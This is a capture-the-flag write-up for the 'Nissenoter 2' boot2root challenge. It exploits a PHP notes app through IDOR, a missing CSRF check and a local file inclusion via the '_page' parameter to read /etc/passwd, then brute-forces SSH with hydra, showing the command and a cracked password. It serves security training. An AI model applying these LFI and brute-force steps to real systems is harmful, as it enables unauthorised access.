+++
title = 'Nissenoter 2'
categories = ['Boot2Root']
date = 2023-12-15T14:33:38+01:00
scrollToTop = true
+++

## Challenge Name:

Nissenoter 2

## Category:

Boot2Root

## Challenge Description:

Vi har brug for din hjælp. Bevis at vores praktikant tager fejl! Skaf os fuld adgang til systemet, så vi kan få fat på alle deres hemmelige noter. Det handler om rigets sikkerhed!

_Opgaven er tilgængelig via Haaukins:_

https://ncctf.haaukins.dk/

## Approach

### Continued enumeration

We managed to secure foothold on the webapp and now we need to continue our enumeration as an authenticated user in order to see if we can "pop a shell" on the system!

From visiting the different pages and trying out functionality, we have discovered the following new endpoints:

```text
| PATH                    | TYPE  | Note                                                                        |
|-------------------------|-------|-----------------------------------------------------------------------------|
| /                       | GET   | Home                                                                        |
| /profile                | GET   | Profile page                                                                |
| /profile/{id}           | GET   | Get profile by ID, which appears to be vuln to IDOR                         |
| /notes                  | GET   | Notes from users                                                            |
| /notes/view/{note_name} | GET   | Get a specific note, which we used to get flag.txt. Potentially vuln to LFI |
| /notes/add              | POST  | Add a note. Potentially an attack vector for reverse shell etc.             |
| /noted/del/{note_name}  | GET   | Delete a note. Does not require CSRF-token!                                 |
| /api/logout             | GET   | Log out...                                                                  |
```

The profile page appears to be vulnerable to [IDOR attacks](https://portswigger.net/web-security/access-control/idor), which I tested to view the other profiles, but no new information came from this exploration, seeing as we had already uncovered users from the database.

Deleting a note can be done without a [CSRF](https://www.educative.io/answers/what-is-cross-site-request-forgery-csfr) token, which is significant as it may allow us to delete more than intended by the developer!

From the "/core.php.php" we can see that there is a global constant called USER_NOTES, which is being used as the directory for all notes on the system.
This folder is directly in the root of the project "/user_notes".
When we take a look inside the folder we see an empty "index.html" file and the following ".htaccess" files

```php
<Files *>
    order deny,allow
    deny from all
</Files>
```

We can further more confirm the presence of this note by accessing it directly in the webapp

![.htaccess note](images/htaccess%20note.png)

This file unfortunately prohibits us from accessing "nissenoter.nc3/user_notes" directly, which would come in handy, if we were to place an evil reverse shell script here.
We shall therefore try to delete the ".htaccess" file with the "/notes/del/.htaccess" request!

Even though the request didn't result in a 500 error message from the backend and initially seemed to be executed, the file is unfortunately still present and that rules out this exploitation path as the system might be preventing deletion of this file.

### LFI exploitation

Lastly we have "/notes/view/{note_name}", which we have already proven to have an [LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) vulnerability by visiting the ".htaccess" file as a note.

Normally when exploiting LFI, we would try to add something like "../../etc/passwd" to enumerate users on the system, but whenever we try this on the webapp we get redirected back to a sane URl.

We therefore need to analyse how routing is implemented in the application to understand if we might be able to exploit LFI with different parameters.

In "/index.php" we can see how routing is handled when trying to view a note, so let's get our hands dirty with some PHP analysis!

```php
# --- Excluded everything until line 122 where the analysis gets interesting --- #
$request_method = $_SERVER['REQUEST_METHOD'];

$page = Variable::getGet('_page', '/');

if(!array_key_exists($request_method, $router)) {
    showErrorPage(405);
}

foreach($router[$request_method] as $uri => $func) {
    $reg = "#^" . $uri . "$#";
    if(preg_match($reg, $page, $params) > 0) {
        [$class, $method] = $func;

        try {
            $class = $controllers[$class];

            array_shift($params);
            if(is_callable([$class, $method])) {
                call_user_func([$class, $method], ...$params);
                die;
            }

            showErrorPage(500);
        } catch(Exception $e) {
            print_r($e);
        }

        break;
    }
}

showErrorPage(404);
```

The application extracts the HTTP request method and stores it in a variable. This variable is later used to check if routes exist for that method. For instance, anything other than POST and GET will result in a 405 Method Not Allowed error.

```php
if(!array_key_exists($request_method, $router)) {
    showErrorPage(405);
}
```

A loop iterates through routes that match the specified $request_method. The $routes[$request_method] variable is a dictionary, with the key set to a URL and the value to an array containing a class reference and a method name. This setup is vital as it dictates how different URLs are processed by the application.

```php
foreach($router[$request_method] as $uri => $func) {
```

The PHP function preg_match is used to match the current page's URL ($page) against a regular expression ($reg). If there's a match, the result is stored in $params.

```php
    $reg = "#^" . $uri . "$#";
    if(preg_match($reg, $page, $params) > 0) {
```

For instance, a URL like notes/view/flag.txt will result in $params containing both the full path and the file name (flag.txt).

```php
$params[0] = 'notes/view/flag.txt';
$params[1] = 'flag.txt';
```

The array_shift function is used to remove the first element from $params, leaving only the file name in the array.

```php
        try {
            $class = $controllers[$class];

            array_shift($params);
```

This is crucial for the LFI vulnerability as it directly influences what file is being accessed!

The application then calls call_user_func([$class, $method], ...$params). This means that the method specified in the route is called directly with user-controlled input, without any validation.

```php
            if(is_callable([$class, $method])) {
                call_user_func([$class, $method], ...$params);
                die;
            }
```

In the case of NotesController, the view method is called, which directly uses $note in file_get_contents, leading to the LFI vulnerability.

```php
$controllers[NotesController::class]->view(...$params);
```

That means the the view method on the class NotesController is being invoked directly with its input, without any form of validation!

The key to exploiting this vulnerability therefore lies in manipulating the "\_page" GET parameter.

By accessing the URL "nissenoter.nc3/?\_page=notes/view/flag.txt", the application interprets this as a request to view the flag.txt note, thus confirming the LFI vulnerability.

![LFI on flag](images/LFI%20on%20flag.png)

Great Scott! This is exciting as it confirms our LFI theory! Now we should be able to view the "/etc/passwd" file and search for a user on the system

![LFI etc/passwd](images/LFI%20users.png)

```bash
root:x:0:0:root:/root:/bin/bash
# --- Excluded system users for better overview --- #
osand:x:1000:1000::/home/osand:/bin/bash
fritz:x:1001:1001::/home/fritz:/bin/bash
hansi:x:1002:1002::/home/hansi:/bin/bash
rrensdyr:x:1003:1003::/home/rrensdyr:/bin/bash
gynter:x:1004:1004::/home/gynter:/bin/bash
nis:x:1005:1005::/home/nis:/bin/bash
```

Huge win for our LFI exploit! We now know which users can access the server! Now we can begin to test the users against our collected password to hopefully find valid SSH credentials!

### Hydra bruteforce SSH

This can be achieved with the tool [hydra](https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/), which is outstanding for bruteforce logins!

```bash
┌──(haaukins㉿kali)-[~]
└─$ hydra -L users.txt -P passwords.txt nissenoter.nc3 ssh -t 4
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-21 10:31:29
[DATA] max 4 tasks per 1 server, overall 4 tasks, 84 login tries (l:6/p:14), ~21 tries per task
[DATA] attacking ssh://nissenoter.nc3:22/
[22][ssh] host: nissenoter.nc3   login: rrensdyr   password: commander007
[STATUS] 84.00 tries/min, 84 tries in 00:01h, 1 to do in 00:01h, 3 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-21 10:32:29
```

Fantastic! It would appear that the naughty reindeer reused his password! (Hopefully Santa won't find out...)

### Getting the second flag

With valid SSH credentials we simply login and fetch the user flag!

```bash
┌──(haaukins㉿kali)-[~]
└─$ ssh rrensdyr@nissenoter.nc3
The authenticity of host 'nissenoter.nc3 (77.229.233.52)' can't be established.
ED25519 key fingerprint is SHA256:1SsZXNDRtiFTRXEnxik0vXpDFxbCdgSSjVsxdSE6wvs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nissenoter.nc3' (ED25519) to the list of known hosts.
rrensdyr@nissenoter.nc3's password:
Linux edc9b2907c7e 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
rrensdyr@edc9b2907c7e:~$ ls
flag.txt
rrensdyr@edc9b2907c7e:~$ cat flag.txt
NC3{1. Snup passwd; 2. Genbrug er god brug; 3: ????; 4: Profit!}
```

Now we can go submit the second flag and move on to the final stage in [Nissenoter 3](/nc3/boot2root/2023/nissenoter-3)!

## Flag

```text
NC3{1. Snup passwd; 2. Genbrug er god brug; 3: ????; 4: Profit!}
```

## Reflections and Learnings

### Importance of Detailed Enumeration:

The initial exploration of the web application was crucial. Identifying endpoints and functionalities laid the groundwork for the subsequent steps. It highlighted the significance of a comprehensive reconnaissance phase in any security assessment.

### Exploiting Local File Inclusion (LFI):

Unraveling the LFI vulnerability by dissecting the PHP code was not an easy journey, but however a critical juncture. This not only emphasized the need for a deep understanding of application behavior but also illustrated how security flaws can be hidden in the logic and routing of an application.

### Innovating Approaches:

The .htaccess files turned out to be a dead-end, which you will face many off when doing CTF events! It is important to accept that a path may not be right and be open-minded enough to pivot towards new paths!

### The Perils of Password Reuse:

The reuse of passwords, as demonstrated by the 'rrensdyr' user, served as a practical example of common security oversights. This scenario stressed the necessity of robust password practices and the risks associated with password reuse.

### The Journey from Vulnerability to Access:

The step-by-step process, from finding vulnerabilities to gaining system access, is a fundamental pattern in penetration testing. This challenge was a testament to the need for patience, thoroughness, and resilience in security testing!
